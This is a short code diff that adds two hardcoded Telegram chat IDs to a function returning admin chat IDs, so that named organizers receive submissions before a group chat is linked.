@@ -340,6 +340,14 @@ export async function getAdminTelegramChatIds(): Promise<string[]> {
     ids.push(...split);
   }
 
+  // Ensure key organizers always receive submissions even before group is linked
+  const defaultAdmins = ['1818017284', '7448389445'];
+  for (const adm of defaultAdmins) {
+    if (!ids.includes(adm)) {
+      ids.push(adm);
+    }
+  }
+
   return Array.from(new Set(ids));
 }
 
